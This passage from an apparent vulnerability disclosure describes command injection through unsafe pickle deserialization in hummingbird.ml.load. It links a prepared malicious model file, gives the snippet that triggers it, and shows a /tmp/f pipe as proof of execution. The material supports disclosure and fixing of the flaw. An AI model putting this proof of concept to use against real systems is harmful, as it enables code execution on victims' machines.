<p>Now we have a malicious pytorch model file <code class="language-plaintext highlighter-rouge">hb_model.zip</code>, you can download from <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/hb_model.zip">github</a>.</p>

<h3 id="start-attack">Start attack</h3>

<p>Use following snippets to load the model back, it will trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from hummingbird.ml import load
load("hb_model", override_flag=True)
</code></pre></div></div>

<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
</code></pre></div></div>

<h3 id="colab">Colab</h3>

<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1vr8BG1rQhJf7qLFoXLZLOCKxFYnqsuY2?usp=sharing">https://colab.research.google.com/drive/1vr8BG1rQhJf7qLFoXLZLOCKxFYnqsuY2?usp=sharing</a></p>

<p><img src="http://live.staticflickr.com/65535/53823382430_a03098fdc4_k.jpg" alt="image" /></p>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. If victims load a malicious pytorch model using <code class="language-plaintext highlighter-rouge">hummingbird.ml.load</code>, command injection can be achieved on victims’ mechine.</p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L172">PyTorchSklearnContainer.load#L172</a></p>

<p><a href="https://github.com/microsoft/hummingbird/blob/d489151e97eaa9d8ec446118b709863a5acab87d/hummingbird/ml/containers/sklearn/pytorch_containers.py#L177">PyTorchSklearnContainer.load#L177</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>